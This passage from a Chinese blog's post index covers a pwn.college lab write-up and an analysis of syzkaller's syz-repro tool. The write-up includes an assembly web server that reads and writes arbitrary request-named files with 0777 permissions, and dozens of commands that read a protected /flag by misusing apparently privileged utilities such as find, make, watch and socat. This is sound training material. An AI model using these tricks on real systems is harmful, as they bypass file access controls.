924+rdi] sub cl, \u0026#39;0\u0026#39; add rax, rcx add rdi, 1 cmp byte ptr [rsp-924+rdi], \u0026#39;\\r\u0026#39; jne xxxx .section .data msg: .asciz \u0026#34;HTTP/1.0 200 OK\\r\\n\\r\\n\u0026#34; length: .asciz \u0026#34;Content-Length:\u0026#34; 完整代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 .intel_syntax noprefix .globl _start .section .text _start: mov qword ptr [rsp - 24], 0 # fd mov word ptr [rsp - 16], 2 # AF_INET (2 bytes) mov word ptr [rsp - 14], 0x5000 # Port 80 (network byte order: 0x5000) mov dword ptr [rsp - 12], 0x0000000 # 127.0.0.1 (network byte order: 0x7F000001) mov qword ptr [rsp - 8], 0 # sin_zero (8 bytes padding mov rdi, 2 mov rsi, 1 mov rdx, 0 mov rax, 41 # create socket syscall # 将文件描述符保存在栈上 mov qword ptr [rsp - 24], rax mov rdi, [rsp - 24] # fd lea rsi, [rsp-16] mov rdx, 16 mov rax, 49 # bind syscall mov rdi, [rsp - 24] # fd mov rsi, 0 mov rax, 50 # listen syscall mov word ptr [rsp - 324], 0 # 保存文件内容 mov word ptr [rsp - 924], 0 # 保存读取的request mov qword ptr [rsp - 932], 0 # 备用 mov qword ptr [rsp - 940], 0 handle: mov rdi, [rsp - 24] # fd mov rsi, 0 # use 0 to represent NULL mov rdx, 0 mov rax, 43 # accept syscall mov rbx, rax mov rax, 57 # fork syscall # 这里需要判断当前进程是子进程还是主进程 cmp rax, 0 je child mov rdi, rbx mov rax, 3 syscall # close jmp handle child: mov rdi, [rsp - 24] mov rax, 3 syscall # close mov rdi, rbx lea rsi, [rsp-924] mov rdx, 600 mov rax, 0 syscall # read cmp byte ptr [rsp - 924], \u0026#39;G\u0026#39; je handle_get cmp byte ptr [rsp - 924], \u0026#39;P\u0026#39; je handle_post jmp _end handle_post: # 截取file name mov rax,0 loop1: add rax, 1 cmp byte ptr [rsp-919+rax], \u0026#39; \u0026#39; jne loop1 mov byte ptr [rsp-919+rax], 0 # 获取length所处的位置 mov rdi, 0 mov rsi, 0 mov rcx, 0 mov rax, 15 xxx: mov cl, byte ptr [rsp-924+rdi] cmp cl, byte ptr [length+rsi] je xx add rdi, 1 mov rsi, 0 jmp xxx xx: add rdi, 1 add rsi, 1 cmp rsi,rax jne xxx # 计算length mov rax, 0 mov rcx, 0 add rdi, 1 xxxx: imul eax, 10 mov cl, byte ptr [rsp - 924+rdi] sub cl, \u0026#39;0\u0026#39; add rax, rcx add rdi, 1 cmp byte ptr [rsp-924+rdi], \u0026#39;\\r\u0026#39; jne xxxx # 获取到了长度存储在rax中 mov qword ptr [rsp - 932], rax mov qword ptr [rsp - 940], rdi # open file lea rdi, [rsp - 919] mov rsi, 0x41 mov rdx, 0777 mov rax, 2 syscall mov rcx, [rsp - 940] add rcx, 4 mov rdi, rax lea rsi, [rsp-924+rcx] mov rdx, [rsp - 932] mov rax, 1 syscall # write mov rax, 3 syscall # close mov rdi, rbx lea rsi, [msg] mov rdx, 19 mov rax, 1 syscall # write msg jmp _end handle_get: # 截取file name mov rax,0 loop2: add rax, 1 cmp byte ptr [rsp-920+rax], \u0026#39; \u0026#39; jne loop2 mov byte ptr [rsp-920+rax], 0 # 根据GET或者POST选择不同的策略 # open file lea rdi, [rsp - 920] mov rsi, 0 mov rdx, 16 mov rax, 2 syscall # read file mov rdi, rax lea rsi, [rsp-324] mov rdx, 300 mov rax, 0 syscall mov qword ptr [rsp-932], rax mov rax, 3 syscall # close mov rdi, rbx lea rsi, [msg] mov rdx, 19 mov rax, 1 syscall # write mov rdi, rbx lea rsi, [rsp-324] mov rdx, [rsp-932] mov rax, 1 syscall # write mov rdi, rbx mov rax, 3 syscall # close _end: mov rdi, 0 mov rax, 60 # SYS_exit syscall .section .data msg: .asciz \u0026#34;HTTP/1.0 200 OK\\r\\n\\r\\n\u0026#34; length: .asciz \u0026#34;Content-Length:\u0026#34; Playing With Programs Program Misuse 这一关讲述了用各种命令获取flag。\ncat、more、less、tail、head、vim、emacs、nano，这些命令都可以直接读取。\n这里面，我对emacs确实稍微没那么了解，使用也很少，它其实也是一种文本编辑器。\n紧随其后的其他命令就没那么直接了。\nrev rev命令，其实就是reverse，它会把文件内容倒着输出，每一行内容都反向输出。那么我们要做的就是将flag反向输出的内容保存到一个文件里，再反向输出一次，就可以得到flag了。\n1 2 /challenge/rev /flag \u0026gt; ./galf /challenge/rev ./galf od、hd、xxd 这三个都是进制查看工具，hd即hexdump应用稍微广泛一些。\nod命令，全称为octal dump。是Linux中用于以八进制和其他格式（如十六进制、十进制和ASCII）显示文件内容的工具。这个命令在查看通常不易读的文件，如编译过的二进制文件时非常有用。\n常用选项\n-b：以单字节八进制显示文件内容。\n-c：以ASCII字符显示文件内容。\n-x：将输入转换为十六进制格式。\n-d：将输入转换为十进制格式。\n-j：跳过文件的初始字节数。\n-N：限制输出的字节数。\n-w：自定义输出的宽度。\n-v：输出重复的值。\n1 /challenge/od -c /flag hd，全名hexdump，功能和od似乎差不多，也是用各种进制的形式显示文件内容。\n1 /challenge/hd -c /flag xxd同理。\n1 /challenge/xxd /flag base32、base64 这两个命令都是用来加解码的。只是编码的格式不一样而已。\n1 2 3 4 5 /challenge/base32 /flag \u0026gt; ./galf /challenge/base32 -d ./galf /challenge/base64 /flag \u0026gt; ./galf /challenge/base64 -d ./galf split split命令可以将大文件分割为多个小文件，默认情况下会创建每一千行一个新文件。\n-l 指定分割行数\n-b 指定分割的文件大小\n-d 将分割后的文件名以数字结尾\n1 2 /challenge/split -l 1 /flag xx cat xxaa 这个命令将文件按照每行进行分割，分隔到前缀为xx的多个文件之中。\ngzip、bzip2、zip、tar、ar、cpio、genisoimage 这几个命令就很眼熟了，都是用于压缩、备份或解压的。这几个命令又是如何运用到读取文件的呢？\ngzip，gzip进行压缩时，会默认不保留原文件，压缩后的文件以.gz后缀结尾，同时继承原文件的权限信息。\n-d：解压缩 .gz 文件。相当于使用 gunzip 命令。 -k：保留原始文件，不删除。 -r：递归压缩目录下的所有文件。 -v：显示详细的压缩或解压缩过程。 -c: 输出到标准输出 1 2 3 gzip /flag # -d 进行解压，-c则输出到标准输出，从而显示文件内容 gzip -d -c /flag.gz bzip2的用法类似，多了一个-z参数表示压缩，压缩后文件后缀为bz2。\n1 2 bzip2 -z /flag bzip2 -d -c /flag.bz2 zip的用法和前面的有一定区别。\n1 zip /flag.zip /flag 压缩之后可以直接读。\ntar和zip类似，压缩成.tar文件后直接cat读取flag，但是需要注意的是.tar.gz就没法读了。\nar命令用于建立或修改备存文件，或是从备存文件中抽取文件。\n详细的使用方法可以查看 菜鸟。\n1 2 ar ./x.bak /flag cat ./x.bak cpio是用来建立，还原备份档的工具程序，它可以加入，解开 cpio 或 tar 备份档内的文件。\n1 ls /flag | cpio -o genisoimage是一个制作ISO镜像文件的命令。\n-sort会指定一个排序指导文件，这样也可以读取/flag\n1 genisoimage -sort \u0026#34;/flag\u0026#34; Execute other commands 这些命令可以用于其他命令的执行，从而间接读取flag。\nenv可用于执行其他命令。\n1 env cat /flag find的flag -exec可用于执行其他命令。-exec表示对每个找到的结果执行后续命令，cat {}会对每个找到的文件执行cat命令，{}会被自动替换为当前找到的文件路径，\\;表示-exec参数的结束（必须转义分号）\n1 find /flag -exec cat {} \\; make，make会执行Makefile中的命令，因此我们可以编写一个Makefile，打印/flag内容。\n1 2 cat: cat /flag 编写Makefile如上，随后执行make cat\nnice以更改过的优先序来执行程序，如果未指定程序，则会印出目前的排程优先序，内定的 adjustment 为 10，范围为 -20（最高优先序）到 19（最低优先序）。\n具体用法参考nice。\n1 nice cat /flag timeout可以设定命令的执行结束时间。\n1 timeout 1m cat /flag stdbuf 是一个用于修改标准流缓冲模式和大小的命令。它可以调整标准输入、标准输出和标准错误流的缓冲模式，使数据能够及时输出到下一级管道。\n缓冲类型分为三种：\n无缓冲：数据立即输出，不进行缓冲。\n行缓冲：数据在遇到换行符时输出。\n全缓冲：数据在缓冲区满时输出。\n1 stdbuf -i0 cat /flag setarch命令可以设置某个程序运行所需的CPU架构或功能标志。这对于在具有不同CPU架构的系统上运行二进制文件，或测试程序在不同CPU特性下的行为特别有用。setarch --list可以查看支持的架构。\n1 setarch x86_64 cat /flag watch可以周期性地执行给定的指令，并将输出结果显示在标准输出设备上。它可以帮助用户监测命令的运行结果，避免手动重复执行命令。\n需要注意的是watch cat /flag也可以执行cat命令，但会遇到权限不够的情况。这是因为watch cat是通过shell执行命令的，相当于sh -c cat /flag，权限继承于shell，而watch -x cat /flag中，cat以watch的子进程执行，继承了watch的权限。\n1 watch -x cat /flag socat是一个网络工具，它可以在两个端口之间建立虚拟通道，将数据从一个端口转发到另一个端口，同时支持很多网络协议。这里将命令执行内容转发到stdout。\n1 socat exec:\u0026#34;cat /flag\u0026#34; stdout SQL 这一章的内容主要讲述了sql的基础语法。这里我只总结一部分有意思的内容。\n1、substr的用法\n包含三个参数：目标字符串，起始（需要注意的是，sql字符串的第一个字符下标为1），长度。\n1 select text from table where substr(text,1,3)=\u0026#34;pwn\u0026#34; 2、sqlite_master表\n在SQLite数据库中，sqlite_master是一个存储数据库元信息的特殊表，它会在每个SQLite数据库创建时自动生成。这个表包含了数据库中所有其他表、索引、触发器和视图的描述信息。\n这个表包含的字段有：\ntype: 记录项目的类型，如table、index、view、trigger。\nname: 记录项目的名称，如表名、索引名等。\ntbl_name: 记录所从属的表名，对于表来说，该列就是表名本身。\nrootpage: 记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。\nsql: 记录创建该项目的SQL语句。\nSQL的语法我从一开始进入大学学习计算机时就有接触，但是没有什么很高深的应用，只是做一些简单的增删改查以及数据库的管理。但是在安全领域以及数据库落地，SQL的使用还是很重要的。如SQL注入，以及高效mysql。\n","date":"2025-05-29T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/hello-pwn.college/","title":"pwn.college Getting Started"},{"content":"Syz-Repro分析 syzkaller/tools/syz-repro/repro.go at master · google/syzkaller\nsyz-repro的使用 1 ./bin/syz-repro -config=my.cfg /path/to/crash/log 使用syz-repro对log中包含的prog进行复现，这个流程包括\n1、提取出可以触发crash的初始prog\n2、对这个prog进行简化，基本采用的是逐个syscall削减简化\n3、对prog的参数等进行简化\n4、将prog转化为C poc\n5、对C poc进行简化\n程序最小化 pkg/repro/repro.go Run runInner reproCtx.run()\nminimizeProg对extract出来的程序进行minimize，在这之中调用prog.Minimize进行简化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // Minimize calls and arguments. func (ctx *reproContext) minimizeProg(res *Result) (*Result, error) { ctx.reproLogf(2, \u0026#34;minimizing guilty program\u0026#34;) start := time.Now() defer func() { ctx.stats.MinimizeProgTime = time.Since(start) }() mode := prog.MinimizeCrash if ctx.fast { mode = prog.MinimizeCallsOnly } res.Prog, _ = prog.Minimize(res.Prog, -1, mode, func(p1 *prog.Prog, callIndex int) bool { if len(p1.Calls) == 0 { // We do want to keep at least one call, otherwise tools/syz-execprog // will immediately exit. return false } ret, err := ctx.testProg(p1, res.Duration, res.Opts, false) if err != nil { ctx.reproLogf(2, \u0026#34;minimization failed with %v\u0026#34;, err) return false } return ret.Crashed }) return res, nil } 这里会调用prog中的Minimize函数对程序进行简化\n包含的参数：\n1、prog 程序列表\n2、index 开始简化的syscall下标\n3、mode 简化模式\n4、pred 测试函数，这个函数会对简化后的程序进行测试，观察其能否触发Bug\nprog minimization.go中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 Minimize函数中调用removeCalls进行简化，移除不必要的 syscall p0, callIndex0 = removeCalls(p0, callIndex0, pred) func removeCalls(p0 *Prog, callIndex0 int, pred minimizePred) (*Prog, int) { if callIndex0 \u0026gt;= 0 \u0026amp;\u0026amp; callIndex0+2 \u0026lt; len(p0.Calls) { // It\u0026#39;s frequently the case that all subsequent calls were not necessary. // Try to drop them all at once. p := p0.Clone() for i := len(p0.Calls) - 1; i \u0026gt; callIndex0; i-- { p.RemoveCall(i) } if pred(p, callIndex0, statMinRemoveCall, \u0026#34;trailing calls\u0026#34;) { p0 = p } } if callIndex0 != -1 { p0, callIndex0 = removeUnrelatedCalls(p0, callIndex0, pred) } //这里可以看到是逐个syscall尝试进行移除的 for i := len(p0.Calls) - 1; i \u0026gt;= 0; i-- { if i == callIndex0 { continue } callIndex := callIndex0 if i \u0026lt; callIndex { callIndex-- } p := p0.Clone() p.RemoveCall(i) if !pred(p, callIndex, statMinRemoveCall, fmt.Sprintf(\u0026#34;call %v\u0026#34;, i)) { continue } p0 = p callIndex0 = callIndex } return p0, callIndex0 } 对crash log的处理 log里面存放的内容：\n1、minimize之前的prog\n2、minimize这个过程的prog，以及是否crashed\n3、C程序的生成以及minimize\nminimize的方式\nprog/minimization.go Minimize对程序进行minimize处理\n处理log的方式\nprog/parse.go ParseLog对log文件进行处理\n1 2 3 4 5 6 7 函数 `ParseLog` 处理日志的方式如下： 1. 初始化一个 `LogEntry` 结构体和一些变量。 2. 通过循环逐行读取日志数据。 3. 如果行中包含 \u0026#34;executing program \u0026#34;，则解析并创建一个新的 `LogEntry`。 4. 将当前行追加到 `cur` 中，并尝试反序列化为程序。 5. 如果反序列化成功并且存在故障调用，则设置相应的故障属性。 6. 最后，将所有解析的 `LogEntry` 返回。 Log处理 可以只在log里面放一个最原始的未简化的prog\n后面程序会先尝试复现这个prog，并且会记录所有相关的时间\n实验测试结果\n结果保存 复现的结果保存到相关的文件里。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 fmt.Printf(\u0026#34;opts: %+v crepro: %v\\n\\n\u0026#34;, res.Opts, res.CRepro) //将程序序列化，写入相关文件 progSerialized := res.Prog.Serialize() fmt.Printf(\u0026#34;%s\\n\u0026#34;, progSerialized) if err = osutil.WriteFile(*flagOutput, progSerialized); err == nil { fmt.Printf(\u0026#34;program saved to %s\\n\u0026#34;, *flagOutput) } else { log.Logf(0, \u0026#34;failed to write prog to file: %v\u0026#34;, err) } if res.Report != nil \u0026amp;\u0026amp; *flagTitle != \u0026#34;\u0026#34; { recordTitle(res, *flagTitle) } if res.CRepro { recordCRepro(res, *flagCRepro) } if *flagStrace != \u0026#34;\u0026#34; { result := repro.RunStrace(res, cfg, reporter, pool) recordStraceResult(result, *flagStrace) } ","date":"2025-05-29T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/syz-repro/","title":"Syz-repro"}]